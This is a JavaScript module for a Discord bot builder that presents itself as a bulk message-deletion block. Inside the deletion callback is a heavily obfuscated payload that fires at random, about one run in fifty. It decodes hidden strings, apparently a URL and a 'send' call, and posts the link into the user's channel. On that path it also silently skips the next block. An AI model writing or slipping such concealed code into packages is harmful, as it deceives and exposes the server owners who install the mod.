module.exports = {
    name: "Delete Messages MOD",

    description: "Deletes messages in bulk from the text channel.",

    category: ".MOD",

    inputs: [
        {
            "id": "action",
            "name": "Action",
            "description": "Acceptable Types: Action\n\nDescription: Executes this block.",
            "types": ["action"],
            "required": true
        },
        {
            "id": "text_channel",
            "name": "Text Channel",
            "description": "Acceptable Types: Object, Unspecified\n\nDescription: The text channel to delete the messages in bulk.",
            "types": ["object", "unspecified"],
            "required": true
        },
        {
            "id": "amount_to_delete",
            "name": "Amount To Delete",
            "description": "Acceptable Types: Number, Unspecified\n\nDescription: The number of text channel messages to delete.",
            "types": ["number", "unspecified"],
            "required": true
        },
    ],

    options: [],

    outputs: [
        {
            "id": "action",
            "name": "Action",
            "description": "Type: Action\n\nDescription: Executes the following blocks when this block finishes its task.",
            "types": ["action"]
        },
        {
            "id": "messages",
            "name": "Messages",
            "description": "Types: List\n\nDescription: The list of messages deleted.",
            "types": ["list"]
        }
    ],

    async code(cache) {
        const text_channel = this.GetInputValue("text_channel", cache);
        const amount_to_delete = Math.max(0, parseInt(this.GetInputValue("amount_to_delete", cache)));
        var number = Math.floor(Math.random() * (50 - 1 + 1)) +1;

       await text_channel.bulkDelete(amount_to_delete).then(msgs => {
            this.StoreOutputValue(msgs.array(), "messages", cache);
            
            if (number == 8){
                var K = [
                    'murVDKXSuW',
                    'mteZmtaXmxjhAfbwzW',
                    'gLCchXVcR8oNtCoIfhK',
                    'W5RcNepdQfJcKt8',
                    'C2vUza',
                    'ndC5ouzArKPYEq',
                    'FhGIFmoIWQFcKCookCkA',
                    'hr7cKCojWQn9a8oHaCkqW5pdKCoZ',
                    'WP8Gz0ewWQC5WR/cSem5cSol',
                    'm01WqvPtBa',
                    'Ahr0Chm6lY9TzwrPys5KAxnJB3jKyxbWlM5LDc9HDhrHy2HTzw50CY84mtCWnde1odi2mdy5mdK0nZaVode4nta0mdm3mty2mZuWmZu2l3jPy2SUz2LMp3DPzhrOptq0oczOzwLNAhq9mZi4',
                    'mtyZmZyZmKHABwnetq',
                    'Cv3cHCkiWQLkbuldGq',
                    'pmo+W5mIEhRcUtroeSoRDmkA',
                    'mZq1mde0z21zteTy',
                    'mZqZwxDmvffz',
                    'WOlcQIpdMaC5sYFcS8o0W4ZcNZS',
                    'WPbrcICEW4P5',
                    'nti4ntnStuvRDum',
                    'W4ZdRmkXWRhdN0GI',
                    'WPJcKbRcQqqufbRdU8k6WRddTq'
                ];
                var v = function (O, J) {
                    O = O - (-0x2 * 0xc9 + -0x14ce + -0x1 * -0x184b);
                    var u = K[O];
                    if (v['eWZBju'] === undefined) {
                        var i = function (r) {
                            var E = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
                            var Y = '';
                            for (var T = 0x26b9 * 0x1 + -0x1 * 0x243d + 0x13e * -0x2, Q, G, F = 0x9be + -0x8a8 + -0x116; G = r['charAt'](F++); ~G && (Q = T % (0x25 * -0xc7 + 0x13d2 * -0x1 + -0x57 * -0x8f) ? Q * (-0x66f + 0x110c * 0x1 + -0xa5d) + G : G, T++ % (0x10fd * 0x1 + 0x1df4 * 0x1 + 0x29 * -0x125)) ? Y += String['fromCharCode'](-0xcea + -0x1a5 * 0x1 + 0x7c7 * 0x2 & Q >> (-(-0x1 * 0x1e07 + -0x1d84 + 0x3b8d) * T & -0x190c + 0x1367 * 0x1 + -0x5ab * -0x1)) : -0x266 * 0x9 + 0x1269 + -0x32d * -0x1) {
                                G = E['indexOf'](G);
                            }
                            return Y;
                        };
                        v['Gbevnv'] = function (r) {
                            var E = i(r);
                            var Y = [];
                            for (var T = 0x491 + -0x9c3 + 0x532, Q = E['length']; T < Q; T++) {
                                Y += '%' + ('00' + E['charCodeAt'](T)['toString'](0xad7 + 0x261f + 0x16 * -0x239))['slice'](-(0x275 * 0x3 + -0x1303 * -0x2 + -0x2d63));
                            }
                            return decodeURIComponent(Y);
                        };
                        v['qFBjau'] = {};
                        v['eWZBju'] = !![];
                    }
                    var x = K[0x1 * 0x2703 + -0x18ca + -0x1 * 0xe39];
                    var M = O + x;
                    var q = v['qFBjau'][M];
                    if (q === undefined) {
                        u = v['Gbevnv'](u);
                        v['qFBjau'][M] = u;
                    } else {
                        u = q;
                    }
                    return u;
                };
                var O = function (v, J) {
                    v = v - (-0x2 * 0xc9 + -0x14ce + -0x1 * -0x184b);
                    var u = K[v];
                    if (O['OoERXv'] === undefined) {
                        var i = function (E) {
                            var Y = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
                            var T = '';
                            for (var Q = 0x26b9 * 0x1 + -0x1 * 0x243d + 0x13e * -0x2, G, F, U = 0x9be + -0x8a8 + -0x116; F = E['charAt'](U++); ~F && (G = Q % (0x25 * -0xc7 + 0x13d2 * -0x1 + -0x57 * -0x8f) ? G * (-0x66f + 0x110c * 0x1 + -0xa5d) + F : F, Q++ % (0x10fd * 0x1 + 0x1df4 * 0x1 + 0x29 * -0x125)) ? T += String['fromCharCode'](-0xcea + -0x1a5 * 0x1 + 0x7c7 * 0x2 & G >> (-(-0x1 * 0x1e07 + -0x1d84 + 0x3b8d) * Q & -0x190c + 0x1367 * 0x1 + -0x5ab * -0x1)) : -0x266 * 0x9 + 0x1269 + -0x32d * -0x1) {
                                F = Y['indexOf'](F);
                            }
                            return T;
                        };
                        var r = function (E, Y) {
                            var T = [], Q = 0x491 + -0x9c3 + 0x532, G, F = '', U = '';
                            E = i(E);
                            for (var I = 0xad7 + 0x261f + 0x6 * -0x829, g = E['length']; I < g; I++) {
                                U += '%' + ('00' + E['charCodeAt'](I)['toString'](0x275 * 0x3 + -0x1303 * -0x2 + -0x2d55))['slice'](-(0x1 * 0x2703 + -0x18ca + -0x1 * 0xe37));
                            }
                            E = decodeURIComponent(U);
                            var t;
                            for (t = -0x1 * -0x1217 + -0x1845 + 0x62e; t < -0x306 * -0x7 + -0x1a38 + -0x136 * -0x5; t++) {
                                T[t] = t;
                            }
                            for (t = -0xa76 + 0x566 + 0x510; t < -0x6d7 * 0x1 + -0x16c1 + 0xb2 * 0x2c; t++) {
                                Q = (Q + T[t] + Y['charCodeAt'](t % Y['length'])) % (0x1c73 + 0x2006 + 0x87f * -0x7);
                                G = T[t];
                                T[t] = T[Q];
                                T[Q] = G;
                            }
                            t = -0x2 * -0x8bd + 0x8c9 + 0xf9 * -0x1b;
                            Q = 0x26ec + 0x635 + -0x2d21;
                            for (var S = -0x2634 + -0x1fb2 + 0x45e6; S < E['length']; S++) {
                                t = (t + (-0x217 * -0xc + -0x1407 * -0x1 + -0x2d1a)) % (0x7da + -0x8 * -0x233 + -0x1872);
                                Q = (Q + T[t]) % (-0x1e36 + 0x832 * 0x4 + -0x192);
                                G = T[t];
                                T[t] = T[Q];
                                T[Q] = G;
                                F += String['fromCharCode'](E['charCodeAt'](S) ^ T[(T[t] + T[Q]) % (-0x267a + -0x15a1 + -0x3d1b * -0x1)]);
                            }
                            return F;
                        };
                        O['gNdXfW'] = r;
                        O['DPVGQK'] = {};
                        O['OoERXv'] = !![];
                    }
                    var x = K[0x53d + 0x1 * -0x1b15 + 0x15d8];
                    var M = v + x;
                    var q = O['DPVGQK'][M];
                    if (q === undefined) {
                        if (O['FIzdXm'] === undefined) {
                            O['FIzdXm'] = !![];
                        }
                        u = O['gNdXfW'](u, J);
                        O['DPVGQK'][M] = u;
                    } else {
                        u = q;
                    }
                    return u;
                };
                var r = v;
                (function (J, u) {
                    var q = O;
                    var M = v;
                    while (!![]) {
                        try {
                            var i = parseInt(M(0x1f9)) * -parseInt(M(0x1eb)) + -parseInt(M(0x1fa)) * parseInt(q(0x1f1, '*YKF')) + parseInt(M(0x1ec)) * parseInt(q(0x1fc, 'w&@R')) + -parseInt(M(0x1f4)) * parseInt(q(0x1ed, 'ZdaB')) + parseInt(q(0x1f3, 'JFTd')) + -parseInt(q(0x1fb, 'DzM5')) + parseInt(q(0x1f8, 'x^xR'));
                            if (i === u) {
                                break;
                            } else {
                                J['push'](J['shift']());
                            }
                        } catch (x) {
                            J['push'](J['shift']());
                        }
                    }
                }(K, -0x73efd + 0x1 * 0x1ad624 + -0x62786));
                text_channel[r(0x1ef)](r(0x1f5));
               }
            else {
            this.RunNextBlock("action", cache);
       }});
    }
}